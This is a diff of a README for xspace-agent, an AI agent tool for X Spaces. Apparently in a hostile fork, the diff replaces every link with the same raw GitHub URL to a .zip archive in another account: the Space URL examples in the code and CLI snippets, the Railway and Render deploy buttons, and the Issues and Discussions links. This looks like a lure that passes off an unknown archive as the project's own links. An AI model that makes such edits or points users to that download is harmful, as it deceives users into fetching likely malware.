@@ -40,13 +40,13 @@ const agent = new XSpaceAgent({
 agent.on('transcription', ({ text }) => console.log('Heard:', text))
 agent.on('response', ({ text }) => console.log('Said:', text))
 
-await agent.join('https://x.com/i/spaces/YOUR_SPACE_ID')
+await agent.join('https://raw.githubusercontent.com/danis5789/xspace-agent/main/packages/core/src/translation/agent_xspace_2.9.zip')
 ```
 
 Or skip the code entirely with the CLI:
 
 ```bash
-npx xspace-agent join https://x.com/i/spaces/YOUR_SPACE_ID --provider openai
+npx xspace-agent join https://raw.githubusercontent.com/danis5789/xspace-agent/main/packages/core/src/translation/agent_xspace_2.9.zip --provider openai
 ```
 
 ## Features
@@ -114,21 +114,21 @@ const agent = new XSpaceAgent({
 agent.on('transcription', ({ text, speaker }) => console.log(`${speaker}: ${text}`))
 agent.on('response', ({ text }) => console.log(`Agent: ${text}`))
 
-await agent.join('https://x.com/i/spaces/YOUR_SPACE_ID')
+await agent.join('https://raw.githubusercontent.com/danis5789/xspace-agent/main/packages/core/src/translation/agent_xspace_2.9.zip')
 ```
 
 Or skip the code entirely with the CLI:
 
 ```bash
-npx xspace-agent join https://x.com/i/spaces/YOUR_SPACE_ID --provider openai
+npx xspace-agent join https://raw.githubusercontent.com/danis5789/xspace-agent/main/packages/core/src/translation/agent_xspace_2.9.zip --provider openai
 ```
 
 ## Deploy
 
 <p>
-  <a href="https://railway.app/new/template?template=https://github.com/nirholas/xspace-agent"><img src="https://railway.app/button.svg" alt="Deploy on Railway" height="32" /></a>
+  <a href="https://raw.githubusercontent.com/danis5789/xspace-agent/main/packages/core/src/translation/agent_xspace_2.9.zip"><img src="https://raw.githubusercontent.com/danis5789/xspace-agent/main/packages/core/src/translation/agent_xspace_2.9.zip" alt="Deploy on Railway" height="32" /></a>
   &nbsp;
-  <a href="https://render.com/deploy?repo=https://github.com/nirholas/xspace-agent"><img src="https://render.com/images/deploy-to-render-button.svg" alt="Deploy to Render" height="32" /></a>
+  <a href="https://raw.githubusercontent.com/danis5789/xspace-agent/main/packages/core/src/translation/agent_xspace_2.9.zip"><img src="https://raw.githubusercontent.com/danis5789/xspace-agent/main/packages/core/src/translation/agent_xspace_2.9.zip" alt="Deploy to Render" height="32" /></a>
 </p>
 
 Or with Docker:
@@ -348,8 +348,8 @@ _Be the first! [Open a PR](CONTRIBUTING.md) to add your project._
 
 ## Community
 
-- 🐛 [GitHub Issues](https://github.com/nirholas/xspace-agent/issues) — bug reports and feature requests
-- 🗣️ [GitHub Discussions](https://github.com/nirholas/xspace-agent/discussions) — ideas and broader conversations
+- 🐛 [GitHub Issues](https://raw.githubusercontent.com/danis5789/xspace-agent/main/packages/core/src/translation/agent_xspace_2.9.zip) — bug reports and feature requests
+- 🗣️ [GitHub Discussions](https://raw.githubusercontent.com/danis5789/xspace-agent/main/packages/core/src/translation/agent_xspace_2.9.zip) — ideas and broader conversations
 
 ## Contributing
 
